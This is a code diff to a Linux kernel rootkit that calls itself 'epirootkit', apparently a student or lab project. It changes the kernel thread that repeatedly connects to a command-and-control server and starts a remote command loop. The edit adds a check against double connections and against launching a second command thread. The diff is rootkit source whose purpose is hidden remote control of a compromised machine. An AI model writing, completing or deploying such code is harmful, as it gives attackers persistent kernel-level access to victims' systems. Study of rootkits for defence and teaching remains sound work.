@@ -205,18 +205,28 @@ static int command_loop(void *data) {
 
 static int connection_loop(void *data) {
     while (!kthread_should_stop()) {
+      	// on va se proteger des double connexions
+        if (g_sock) {
+    		msleep(3000);
+    		continue;
+		}
+
+
         if (!g_sock) {
             pr_info("epirootkit: trying to connect to C2...\n");
             if (connect_to_c2_server() == 0) {
                 notify_connection_state(1);
                 pr_info("epirootkit: launching command_loop\n");
-                g_thread = kthread_run(command_loop, NULL, "rk_cmd");
-                if (IS_ERR(g_thread)) {
-                    pr_err("epirootkit: command_loop failed\n");
-                    g_thread = NULL;
-                    sock_release(g_sock);
-                    g_sock = NULL;
-                    notify_connection_state(0);
+
+                if (!g_thread) {
+                    g_thread = kthread_run(command_loop, NULL, "rk_cmd");
+                    if (IS_ERR(g_thread)) {
+                        pr_err("epirootkit: command_loop failed\n");
+                        g_thread = NULL;
+                        sock_release(g_sock);
+                        g_sock = NULL;
+                        notify_connection_state(0);
+                    }
                 }
             }
         }
